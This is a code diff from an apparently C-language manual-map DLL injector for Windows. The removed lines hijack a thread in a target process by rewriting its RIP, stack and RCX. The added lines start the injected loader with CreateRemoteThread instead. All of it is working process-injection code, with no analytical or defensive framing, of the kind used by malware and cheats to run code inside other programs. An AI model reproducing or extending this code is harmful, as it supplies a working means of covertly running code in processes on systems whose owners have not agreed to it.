@@ -209,50 +209,12 @@ void _start(void) {
     MANUAL_MAP_DATA *pRemoteData = (MANUAL_MAP_DATA*)(pLoader + 0x800);
     WriteProcessMemory(hProc, pRemoteData, &mapData, sizeof(mapData), NULL);
 
-    // Thread hijack - find a thread in target process
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) ExitProcess(5);
+    // Use CreateRemoteThread (simpler, more reliable)
+    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoader, pRemoteData, 0, NULL);
+    if (!hThread) ExitProcess(5);
 
-    THREADENTRY32 te = {0};
-    te.dwSize = sizeof(te);
-    DWORD tid = 0;
-
-    if (Thread32First(hSnap, &te)) {
-        do {
-            if (te.th32OwnerProcessID == pid) {
-                tid = te.th32ThreadID;
-                break;
-            }
-        } while (Thread32Next(hSnap, &te));
-    }
-    CloseHandle(hSnap);
-    if (!tid) ExitProcess(6);
-
-    // Hijack the thread
-    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
-    if (!hThread) ExitProcess(7);
-
-    SuspendThread(hThread);
-
-    CONTEXT ctx = {0};
-    ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(hThread, &ctx);
-
-    // Save original RIP, push it on stack so RET returns there
-    ctx.Rsp -= 8;
-    WriteProcessMemory(hProc, (PVOID)ctx.Rsp, &ctx.Rip, 8, NULL);
-
-    // Set RCX = param (x64 calling convention)
-    ctx.Rcx = (DWORD64)pRemoteData;
-
-    // Set RIP = our loader
-    ctx.Rip = (DWORD64)pLoader;
-
-    SetThreadContext(hThread, &ctx);
-    ResumeThread(hThread);
-
-    // Wait a bit for loader to finish (can't WaitForSingleObject on hijacked thread)
-    Sleep(1000);
+    // Wait for loader to finish
+    WaitForSingleObject(hThread, 5000);
 
     CloseHandle(hThread);
     CloseHandle(hProc);
